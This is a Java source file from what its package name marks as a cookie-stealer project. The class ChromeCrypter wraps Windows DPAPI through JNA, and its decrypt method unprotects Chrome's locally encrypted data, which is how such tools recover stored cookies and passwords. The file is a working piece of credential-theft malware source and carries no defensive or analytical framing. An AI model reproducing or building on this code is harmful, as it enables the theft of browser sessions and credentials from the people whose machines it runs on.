package com.catthoor.cookiestealer.encryption;

import com.sun.jna.platform.win32.Crypt32Util;

import java.io.UnsupportedEncodingException;

public class ChromeCrypter implements Crypter<byte[], String> {

    @Override
    public byte[] encrypt(String toEncrypt) {
        return Crypt32Util.cryptProtectData(toEncrypt.getBytes());
    }

    @Override
    public String decrypt(byte[] toDecrypt) {
        String decrypted = null;
        try {
            decrypted = new String(Crypt32Util.cryptUnprotectData(toDecrypt), "UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return decrypted;
    }
}